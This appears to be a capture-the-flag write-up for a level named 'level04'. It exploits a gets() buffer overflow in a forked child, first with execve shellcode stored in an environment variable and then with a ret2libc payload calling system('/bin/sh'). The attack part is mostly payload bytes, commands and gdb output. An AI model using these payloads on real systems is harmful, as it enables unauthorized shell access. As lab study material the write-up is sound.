# Ret2libc

## Protection

RELRO | STACK CANARY | NX | PIE
--- | --- | --- | --- 
**Partial RELRO** | No canary found | NX disabled | No PIE

## context

The program fork and the child basic overflow with gets() function.

I try shell it:

## Shell Code

To calcul the offset you need to follow child process in gdb:

```py
set follow-fork-mode child
stopped 0x6261616f in ??
Found at offset 156 (little-endian search) likely
```

so lets build this payload : 

Payload= offset + buffer address(env)

I export shell code in the env:

```bash
export SHELLCODE=$(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 0xffff + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

- shell =```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)
- buffer env = 0xffff0101

exploit : 

```bash
cat <(python2.7 -c 'import sys; sys.stdout.write(b"a" * 156 + b"\x01\x01\xff\xff")') - | ./level04
Give me some shellcode, k

no exec() for you()
```

Aie ! main block exec() function.

```c
      local_18 = ptrace(PTRACE_PEEKUSER,child_pid,0x2c,0);
```

Lets call system function contain in libc

```bash
$> nm -D /lib32/libc.so.6 | grep system
00047cb0 W system@@GLIBC_2.0

$> strings /lib32/libc.so.6 | grep /bin
/bin/sh
```

## Ret2Libc

First of all lets tcheck if aslr is activated: 

```bash
cat /proc/sys/kernel/randomize_va_space
0
```

- 0: No randomization, the address space is completely static.
- 1: Partial randomization, stack and heap addresses are randomized, but shared libraries are still loaded at the same address.
- 2: Full randomization, the entire address space is randomized, including shared libraries.

**2** could be a problem because libc.so.6 could be load at diffenrent address between each calls.

Payload : [ Offset ] [ system() address] [ return address] [ "/bin/sh" address ]

```py
info functions system
0xf7e6aed0  system

info functions exit
0xf7e5eb70  exit

info proc mapping
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

Exploit:

```bash
cat <(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 156 + b"\xd0\xae\xe6\xf7" + b"\x70\xeb\xe5\xf7" + b"\xec\x97\xf8\xf7")') - | ./level04
```